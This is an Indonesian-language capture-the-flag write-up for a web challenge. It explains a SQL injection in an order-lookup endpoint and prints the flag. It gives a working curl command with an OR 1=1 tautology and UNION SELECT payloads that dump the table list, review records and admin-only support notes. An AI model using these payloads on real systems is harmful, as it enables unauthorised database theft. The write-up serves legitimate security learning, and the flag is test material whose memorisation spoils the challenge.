---
ctf: "RIFFHACK 2026"
kategori: "Web"
challenge: "Buyer Lookup Loose Query"
flag: "bitflag{1nj3ct10n_turn5_4_l00kup_1nt0_4_l34k}"
teknik: "SQL string-concatenated pada /api/orders/lookup?ref=...; UNION SELECT jadi primitive dump-DB universal untuk sisa event"
---

# Buyer Lookup Loose Query — RIFFHACK 2026 (Web)

## Deskripsi Singkat

Primitive dump-seed universal untuk sisa event ini. `/api/orders/lookup?ref=<value>` membangun SQL-nya dengan concatenation string, memberi tautologi klasik dan injection berbasis UNION.

## Analisis & Eksploitasi

Respons normal punya proyeksi enam-kolom, keyed oleh id literal. Cocok dengan `SELECT id, listingName, price, status, notes, createdAt FROM "Order" WHERE id = '<input>'` tanpa parameter binding.

```bash
curl -s -b "$COOKIE" --data-urlencode "ref=' OR 1=1 --" \
     -G 'http://159.89.230.27/api/orders/lookup'
```

Tiga baris kembali. Yang tidak muncul di tempat lain: `ops-ledger-9001` dengan `status:"hidden"`, baris yang seharusnya tidak pernah dilihat user biasa. Field `notes`-nya membawa flag:

```json
{"id":"ops-ledger-9001","listingName":"CloudPwn Toolkit","price":499.99,
 "status":"hidden","notes":"bitflag{1nj3ct10n_turn5_4_l00kup_1nt0_4_l34k}"}
```

Jumlah kolom enam dikonfirmasi lewat `UNION SELECT 1,2,3,4,5,6 --` yang mengembalikan satu baris literal.

**Pivot universal.** Begitu kamu punya UNION pada proyeksi enam-kolom, endpoint yang sama jadi pembacaan DB generik yang dipakai di setiap langkah "cari seed userId" atau "dump kolom admin-only" di sisa event:

```sql
-- list tabel
' UNION SELECT name,'',0,'','',0 FROM sqlite_master --
-- seed reviews (dipakai web6 → web7)
' UNION SELECT id,userId,listingId,reviewText,moderationNote,createdAt
  FROM Review WHERE moderationNote IS NOT NULL --
-- seed support messages termasuk internalNote admin-only (Night Dump)
' UNION SELECT id,userId,message,internalNote,createdAt,0
  FROM SupportChatMessage WHERE id='support-seed-a16' --
```

## Catatan / Insight

Endpoint lookup-nya diam-diam jadi master key untuk sisa event ini.

## Flag

```
bitflag{1nj3ct10n_turn5_4_l00kup_1nt0_4_l34k}
```
